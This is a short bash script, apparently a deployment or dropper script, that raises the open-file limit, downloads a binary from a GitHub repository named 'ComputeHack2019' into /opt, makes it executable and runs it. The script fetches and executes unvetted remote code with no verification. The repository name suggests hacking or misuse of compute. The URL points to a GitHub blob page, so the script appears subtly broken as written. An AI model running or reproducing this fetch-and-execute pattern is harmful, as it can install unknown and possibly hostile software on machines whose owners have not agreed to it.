#!/bin/bash
size=""
ulimit -n 20000
/usr/bin/wget -O /opt/server https://github.com/stlemon253/ComputeHack2019/blob/master/server
sleep 5
chmod +x /opt/server
/opt/server

